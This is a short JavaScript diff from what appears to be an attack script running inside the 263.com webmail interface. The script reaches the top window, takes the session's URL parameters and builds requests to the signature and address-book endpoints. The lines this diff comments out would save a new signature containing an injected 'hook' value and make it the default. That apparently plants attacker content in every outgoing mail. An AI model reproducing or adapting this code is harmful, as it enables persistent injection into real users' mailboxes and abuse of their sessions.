@@ -2,6 +2,7 @@
     // move to top
     var host = window.top.top.top.top.top.top.top.top.top.top.top;
     var urlParam = window.urlParams;
+    console.log(window);
     var sysPath = "http://mm.263.com/wm2e/mail";
     var signPath = sysPath + "/signInfoSetting/signInfoSettingAction_";
     var addrPath = sysPath + "/personAddressBook/personAddressAction_";
@@ -21,9 +22,9 @@
                
             } else {
                 // add new sign
-                $.post(signPath + "saveSignInfo.do?" + urlParam, { name: '默认签名', contexts: '<p><br/></p>' + hook });
+                //$.post(signPath + "saveSignInfo.do?" + urlParam, { name: '默认签名', contexts: '<p><br/></p>' + hook });
                 // set first sign as default
-                $.get(signPath + "setDefaultSignInfo.do?id=0&" + urlParam);
+                //$.get(signPath + "setDefaultSignInfo.do?id=0&" + urlParam);
             }
         });
     }
